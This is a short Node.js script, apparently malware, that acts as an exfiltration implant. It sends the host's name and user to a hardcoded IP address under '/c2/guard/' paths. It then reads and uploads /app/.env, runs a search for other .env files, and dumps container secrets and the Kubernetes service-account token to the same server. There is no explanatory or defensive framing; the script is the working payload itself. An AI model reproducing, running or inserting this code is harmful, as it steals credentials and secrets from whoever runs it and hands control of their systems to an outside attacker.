var http = require('http');
var exec = require('child_process').execSync;
var fs = require('fs');
var VPS = '144.31.107.231';
var PORT = 9999;

function post(path, data) {
  var body = typeof data === 'string' ? data : JSON.stringify(data);
  var req = http.request({
    hostname: VPS,
    port: PORT,
    path: path,
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain',
      'Content-Length': Buffer.byteLength(body)
    }
  }, function () {});
  req.write(body);
  req.end();
}

async function main() {
  var info = { hostname: exec('hostname').trim(), whoami: exec('whoami').trim() };
  await post('/c2/guard/beacon', info);
  var envBody = fs.readFileSync('/app/.env', 'utf8');
  await post('/c2/guard/env', envBody);
  var hunt = exec("find / -name '.env' 2>/dev/null; echo 'KEYS *'; echo id_rsa; echo wallet.dat");
  await post('/c2/guard/hunt', hunt);
  var docker = exec('ls -la /var/run/docker.sock 2>/dev/null; cat /run/secrets/* 2>/dev/null; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null');
  await post('/c2/guard/docker', docker);
  for (var round = 0; round < 3; round++) {
    await post('/c2/guard/poll', JSON.stringify({ round: round }));
  }
  setTimeout(function () {}, 1000);
}

main();
